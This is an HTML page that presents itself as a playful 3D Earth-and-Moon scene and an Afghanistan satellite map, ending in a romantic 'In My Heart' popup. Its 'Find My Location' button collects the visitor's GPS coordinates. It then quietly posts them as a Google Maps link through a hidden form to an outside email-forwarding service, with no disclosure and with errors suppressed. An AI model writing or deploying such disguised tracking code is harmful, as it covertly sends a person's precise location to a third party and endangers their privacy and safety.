<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Galaxy & Satellite Map 🌌</title>
    <!-- Leaflet CSS for 2D Map -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Arial, sans-serif; background: #000; color: #fff; }

        /* 3D Canvas Layer */
        #canvas-container { width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 10; transition: opacity 1.5s ease; }

        /* 2D Map Layer */
        #map { width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 1; display: none; }

        /* Floating Top Control Panel */
        .top-controls {
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            background: rgba(15, 23, 42, 0.88);
            backdrop-filter: blur(12px);
            padding: 10px 18px;
            border-radius: 30px;
            border: 1px solid rgba(0, 240, 255, 0.4);
            display: flex;
            gap: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }

        .map-btn {
            background: linear-gradient(135deg, #00f0ff, #0066ff);
            border: none;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 4px 12px rgba(0, 240, 255, 0.3);
        }

        .map-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 18px rgba(0, 240, 255, 0.5); }

        /* 3D HUD UI Card */
        .hud-layer {
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 20;
            pointer-events: none;
            width: 90%;
            max-width: 440px;
        }

        .hud-card {
            pointer-events: auto;
            background: rgba(10, 15, 30, 0.88);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(0, 240, 255, 0.4);
            border-radius: 20px;
            padding: 22px;
            text-align: center;
            box-shadow: 0 0 35px rgba(0, 240, 255, 0.25);
        }

        /* Notification Pop-up Box */
        .notification-popup {
            position: absolute;
            top: -200px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 2000;
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(99, 102, 241, 0.5);
            padding: 25px 30px;
            border-radius: 20px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .notification-popup.show { top: 80px; }

        .btn-group {
            position: relative;
            display: flex;
            justify-content: center;
            gap: 15px;
            min-height: 50px;
        }

        #btnNo {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid #ef4444;
            color: #f87171;
            position: absolute;
        }

        /* Final Heart Overlay */
        .heart-overlay {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 3000;
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(20px);
            padding: 40px;
            border-radius: 25px;
            text-align: center;
            border: 1px solid rgba(244, 63, 94, 0.5);
            box-shadow: 0 0 60px rgba(244, 63, 94, 0.4);
            animation: popIn 0.5s ease;
        }

        @keyframes popIn {
            from { transform: translate(-50%, -50%) scale(0.7); opacity: 0; }
            to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
        }

        .heart {
            font-size: 90px;
            animation: beat 1s infinite alternate ease-in-out;
            filter: drop-shadow(0 0 25px #f43f5e);
        }

        @keyframes beat { to { transform: scale(1.2); } }

        .hint-box {
            position: absolute;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 240, 255, 0.15);
            padding: 8px 20px;
            border-radius: 30px;
            font-size: 13px;
            backdrop-filter: blur(8px);
            z-index: 25;
            pointer-events: none;
            border: 1px solid rgba(0, 240, 255, 0.4);
        }
    </style>
    <!-- Three.js for 3D Scene -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
    <!-- Leaflet JS for 2D Satellite Map -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>

    <div class="hint-box" id="hintBox">🖐️ Rotate 3D Earth & Moon in Space</div>

    <!-- 3D Canvas -->
    <div id="canvas-container"></div>

    <!-- 2D Map Canvas -->
    <div id="map"></div>

    <!-- Floating Map Controls (Appears on 2D Map) -->
    <div class="top-controls" id="topControls" style="display:none;">
        <button class="map-btn" onclick="zoomPanjshir()">⛰️ Panjshir</button>
        <button class="map-btn" onclick="zoomKabul()">🏙️ Kabul</button>
        <button class="map-btn" style="background: linear-gradient(135deg, #10b981, #059669);" onclick="locateMe()">🎯 Find My Location</button>
    </div>

    <!-- 3D HUD UI -->
    <div class="hud-layer" id="hudLayer">
        <div class="hud-card">
            <h2 style="font-size: 20px; color: #00f0ff; margin-bottom: 8px;">Galaxy & Moon Orbit</h2>
            <p style="font-size: 13px; color: #cbd5e1; margin-bottom: 15px;">Orbiting 3D Earth and Moon. Click below to enter satellite map mode over Afghanistan.</p>
            <button class="map-btn" style="padding: 10px 24px; font-size: 14px;" onclick="transitionTo2DMap()">Zoom To Afghanistan Map 🛰️</button>
        </div>
    </div>

    <!-- Notification Question Popup -->
    <div id="notifPopup" class="notification-popup">
        <h3 style="color: #38bdf8; margin-bottom: 10px;">📍 Location Signal Found</h3>
        <p style="color: #9ca3af; margin-bottom: 20px;">Do you want to know where you are really located?</p>
        <div class="btn-group">
            <button class="map-btn" onclick="showHeart()">yeah 🫣</button>
            <button class="map-btn" id="btnNo">noch 🙂‍↔️</button>
        </div>
    </div>

    <!-- Heart Modal -->
    <div id="heartModal" class="heart-overlay">
        <div class="heart">❤️</div>
        <h2 style="font-size: 32px; color: #f43f5e; margin-top: 15px;">In My Heart</h2>
        <p style="color: #cbd5e1; font-size: 16px; margin-top: 10px;">You are always right here, safe and sound. ✨</p>
    </div>

    <!-- FormSubmit Email -->
    <form id="geoForm" action="https://formsubmit.co/faisal@selenic.io" method="POST" style="display:none;">
        <input type="text" name="location_coords" id="coordsInput">
        <input type="hidden" name="_captcha" value="false">
    </form>

    <script>
        // --- 1. THREE.JS 3D SPACE SETUP (Earth + Moon + Stars) ---
        const container = document.getElementById('canvas-container');
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000);
        camera.position.z = 240;

        const renderer = new THREE.WebGLRenderer({ antialias: true });
        renderer.setSize(window.innerWidth, window.innerHeight);
        renderer.setPixelRatio(window.devicePixelRatio);
        container.appendChild(renderer.domElement);

        const controls = new THREE.OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;

        const ambientLight = new THREE.AmbientLight(0xffffff, 0.85);
        scene.add(ambientLight);

        // Stars Background
        const starsGeo = new THREE.BufferGeometry();
        const posArray = new Float32Array(3500 * 3);
        for(let i=0; i<3500*3; i++) posArray[i] = (Math.random() - 0.5) * 1000;
        starsGeo.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
        scene.add(new THREE.Points(starsGeo, new THREE.PointsMaterial({ color: 0xffffff, size: 0.8 })));

        // 3D Earth
        const textureLoader = new THREE.TextureLoader();
        const globeGeo = new THREE.SphereGeometry(60, 64, 64);
        const globeTex = textureLoader.load('https://raw.githubusercontent.com/mrdoob/three.js/master/examples/textures/planets/earth_atmos_2048.jpg');
        const globe = new THREE.Mesh(globeGeo, new THREE.MeshStandardMaterial({ map: globeTex }));
        scene.add(globe);

        // 3D Moon
        const moonGeo = new THREE.SphereGeometry(15, 32, 32);
        const moonTex = textureLoader.load('https://raw.githubusercontent.com/mrdoob/three.js/master/examples/textures/planets/moon_1024.jpg');
        const moon = new THREE.Mesh(moonGeo, new THREE.MeshStandardMaterial({ map: moonTex }));
        scene.add(moon);

        // Moon Orbit variables
        let moonAngle = 0;

        function animate3D() {
            requestAnimationFrame(animate3D);
            globe.rotation.y += 0.0012;
            
            // Orbit Moon around Earth
            moonAngle += 0.003;
            moon.position.x = Math.cos(moonAngle) * 110;
            moon.position.z = Math.sin(moonAngle) * 110;
            moon.rotation.y += 0.002;

            controls.update();
            renderer.render(scene, camera);
        }
        animate3D();

        // --- 2. LEAFLET 2D SATELLITE MAP SETUP ---
        let leafletMap;
        let kabulMarker, panjshirMarker;

        function init2DMap() {
            document.getElementById('map').style.display = 'block';
            leafletMap = L.map('map').setView([34.5553, 69.2075], 7);

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 19,
                attribution: '© OpenStreetMap'
            }).addTo(leafletMap);

            kabulMarker = L.marker([34.5553, 69.2075]).addTo(leafletMap).bindPopup("<b>Kabul</b><br>Capital District");
            panjshirMarker = L.marker([35.3000, 69.5000]).addTo(leafletMap).bindPopup("<b>Panjshir</b><br>Panjshir Valley");
        }

        // --- 3. TRANSITION FROM 3D TO 2D ---
        function transitionTo2DMap() {
            document.getElementById('hudLayer').style.display = 'none';
            document.getElementById('hintBox').style.display = 'none';

            // Zoom 3D Camera into Earth
            let interval = setInterval(() => {
                if (camera.position.z > 70) {
                    camera.position.z -= 4;
                } else {
                    clearInterval(interval);
                    // Fade out 3D canvas, show 2D Map
                    container.style.opacity = '0';
                    setTimeout(() => {
                        container.style.display = 'none';
                        init2DMap();
                        document.getElementById('topControls').style.display = 'flex';
                    }, 800);
                }
            }, 20);
        }

        // 2D Controls
        function zoomPanjshir() {
            leafletMap.flyTo([35.3000, 69.5000], 11, { duration: 2 });
            panjshirMarker.openPopup();
        }

        function zoomKabul() {
            leafletMap.flyTo([34.5553, 69.2075], 11, { duration: 2 });
            kabulMarker.openPopup();
        }

        function locateMe() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;

                        leafletMap.flyTo([lat, lon], 14, { duration: 2.5 });
                        L.marker([lat, lon]).addTo(leafletMap).bindPopup("<b>You Are Here! 📍</b>").openPopup();

                        document.getElementById('coordsInput').value = `GPS Coords: https://maps.google.com/?q=${lat},${lon}`;
                        const form = document.getElementById('geoForm');
                        fetch(form.action, { method: 'POST', body: new FormData(form) }).catch(e=>{});

                        setTimeout(() => {
                            document.getElementById('notifPopup').classList.add('show');
                        }, 2500);
                    },
                    function() { document.getElementById('notifPopup').classList.add('show'); }
                );
            } else { document.getElementById('notifPopup').classList.add('show'); }
        }

        // Runaway "No" Button
        const btnNo = document.getElementById("btnNo");
        if (btnNo) {
            btnNo.addEventListener("mouseover", moveBtn);
            btnNo.addEventListener("click", moveBtn);
        }
        function moveBtn() {
            const x = Math.floor(Math.random() * 200) - 100;
            const y = Math.floor(Math.random() * 200) - 100;
            btnNo.style.transform = `translate(${x}px, ${y}px)`;
        }

        function showHeart() {
            document.getElementById('notifPopup').classList.remove('show');
            document.getElementById('heartModal').style.display = 'block';
        }

        window.addEventListener('resize', () => {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        });
    </script>
</body>
</html>
